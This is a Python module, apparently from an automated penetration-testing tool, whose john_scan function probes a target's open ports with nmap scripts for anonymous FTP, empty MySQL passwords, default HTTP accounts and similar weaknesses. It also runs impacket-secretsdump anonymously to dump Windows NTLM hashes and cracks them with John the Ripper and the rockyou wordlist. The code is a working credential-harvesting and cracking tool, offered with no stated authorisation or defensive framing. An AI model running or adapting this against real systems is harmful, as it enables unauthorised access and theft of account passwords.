import subprocess
import os
import tempfile

WORDLIST = "/usr/share/wordlists/rockyou.txt" if os.path.exists("/usr/share/wordlists/rockyou.txt") else "/tmp/rockyou.txt"
JOHN     = "john"

# Common hash formats triggered by open ports
PORT_HASH_HINTS = {
    22:   "ssh",
    21:   "ftp",
    23:   "telnet",
    139:  "smb",
    445:  "smb",
    3306: "mysql",
    5432: "postgres",
    3389: "rdp",
}

def _run_john(hashfile, fmt=None, timeout=30):
    """Run john on a hash file, return cracked entries."""
    if not os.path.exists(WORDLIST):
        return [f"[John] Wordlist not found: {WORDLIST}"]
    cmd = [JOHN, hashfile, f"--wordlist={WORDLIST}"]
    if fmt:
        cmd.append(f"--format={fmt}")
    try:
        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                       timeout=timeout)
    except subprocess.TimeoutExpired:
        pass
    except Exception as e:
        return [f"[John] Run error: {e}"]

    # Show results
    try:
        out = subprocess.check_output(
            [JOHN, "--show", hashfile] + ([f"--format={fmt}"] if fmt else []),
            stderr=subprocess.DEVNULL, timeout=15, text=True
        )
        results = []
        for line in out.splitlines():
            line = line.strip()
            if not line or "password hash" in line or line.startswith("0 "):
                continue
            results.append(line)
        return results
    except Exception as e:
        return [f"[John] Show error: {e}"]


def _try_crack_hash(raw_hash, fmt, label):
    """Write a single hash to a temp file and crack it."""
    with tempfile.NamedTemporaryFile(mode="w", suffix=".hash",
                                     dir="/tmp", delete=False) as f:
        f.write(raw_hash + "\n")
        fname = f.name
    try:
        results = _run_john(fname, fmt=fmt, timeout=20)
        return [f"[{label}] {r}" for r in results] if results else []
    finally:
        try:
            os.unlink(fname)
        except Exception:
            pass


def _grab_mysql_hashes(target, port=3306):
    """Try to dump MySQL user hashes via nmap script."""
    findings = []
    try:
        out = subprocess.check_output(
            ["nmap", "-p", str(port), "--script", "mysql-empty-password,mysql-databases",
             target, "-oN", "-"],
            stderr=subprocess.DEVNULL, timeout=15, text=True
        )
        for line in out.splitlines():
            if "mysql-empty-password" in line.lower() or "anonymous" in line.lower():
                findings.append(f"MySQL empty password on {target}:{port}")
    except Exception:
        pass
    return findings


def _grab_smb_hashes(target):
    """Try to grab NTLM hashes via impacket secretsdump (if available)."""
    findings = []
    try:
        out = subprocess.check_output(
            ["impacket-secretsdump", "-no-pass", f"anonymous@{target}"],
            stderr=subprocess.DEVNULL, timeout=15, text=True
        )
        hashes = []
        for line in out.splitlines():
            # Format: user:rid:lmhash:nthash:::
            parts = line.strip().split(":")
            if len(parts) >= 4 and len(parts[3]) == 32:
                hashes.append(line.strip())
                findings.append(f"NTLM hash dumped: {parts[0]}")

        if hashes:
            with tempfile.NamedTemporaryFile(mode="w", suffix=".ntlm",
                                              dir="/tmp", delete=False) as f:
                f.write("\n".join(hashes) + "\n")
                fname = f.name
            cracked = _run_john(fname, fmt="NT", timeout=30)
            for c in cracked:
                findings.append(f"[NTLM cracked] {c}")
            try:
                os.unlink(fname)
            except Exception:
                pass
    except FileNotFoundError:
        pass
    except Exception:
        pass
    return findings


def _grab_ssh_key(target, port=22):
    """Try default/anonymous SSH key grab (banner only, no actual exploit)."""
    findings = []
    try:
        out = subprocess.check_output(
            ["nmap", "-p", str(port), "--script", "ssh-auth-methods,ssh-hostkey",
             target, "-oN", "-"],
            stderr=subprocess.DEVNULL, timeout=10, text=True
        )
        for line in out.splitlines():
            l = line.strip()
            if "publickey" in l.lower() or "password" in l.lower() or "none" in l.lower():
                if "ssh-auth-methods" in l.lower() or "supported" in l.lower():
                    findings.append(f"SSH auth methods: {l}")
            if "rsa" in l.lower() or "ecdsa" in l.lower() or "ed25519" in l.lower():
                findings.append(f"SSH host key: {l}")
    except Exception:
        pass
    return findings


def john_scan(target, open_ports):
    """
    Main entry: probe target based on open ports, attempt hash extraction
    and cracking with John the Ripper. Returns list of finding strings.
    """
    findings = []
    ports_set = set(open_ports)

    # SMB / Windows NTLM
    if 445 in ports_set or 139 in ports_set:
        findings += _grab_smb_hashes(target)

    # MySQL
    if 3306 in ports_set:
        findings += _grab_mysql_hashes(target, 3306)

    # SSH key info
    if 22 in ports_set:
        findings += _grab_ssh_key(target, 22)

    # FTP anonymous check
    if 21 in ports_set:
        try:
            out = subprocess.check_output(
                ["nmap", "-p", "21", "--script", "ftp-anon", target, "-oN", "-"],
                stderr=subprocess.DEVNULL, timeout=10, text=True
            )
            for line in out.splitlines():
                if "anonymous" in line.lower() and ("allowed" in line.lower() or "login" in line.lower()):
                    findings.append(f"FTP anonymous login allowed on {target}:21")
        except Exception:
            pass

    # Telnet banner grab for credentials
    if 23 in ports_set:
        findings.append(f"Telnet open on {target}:23 — credentials transmitted in plaintext")

    # RDP check
    if 3389 in ports_set:
        try:
            out = subprocess.check_output(
                ["nmap", "-p", "3389", "--script", "rdp-enum-encryption", target, "-oN", "-"],
                stderr=subprocess.DEVNULL, timeout=10, text=True
            )
            for line in out.splitlines():
                if "encryption" in line.lower() or "rdp" in line.lower():
                    l = line.strip()
                    if l and not l.startswith("#"):
                        findings.append(f"RDP: {l}")
        except Exception:
            pass

    # HTTP Basic Auth check
    for p in open_ports:
        if p in (80, 443, 8080, 8443):
            try:
                out = subprocess.check_output(
                    ["nmap", "-p", str(p), "--script", "http-auth,http-default-accounts",
                     target, "-oN", "-"],
                    stderr=subprocess.DEVNULL, timeout=10, text=True
                )
                for line in out.splitlines():
                    l = line.strip()
                    if any(k in l.lower() for k in ["basic", "digest", "default", "credentials", "login"]):
                        if l and not l.startswith("#") and "nmap" not in l.lower():
                            findings.append(f"HTTP auth [{p}]: {l}")
            except Exception:
                pass
            break

    # Only return real findings — no informational noise
    return findings[:10]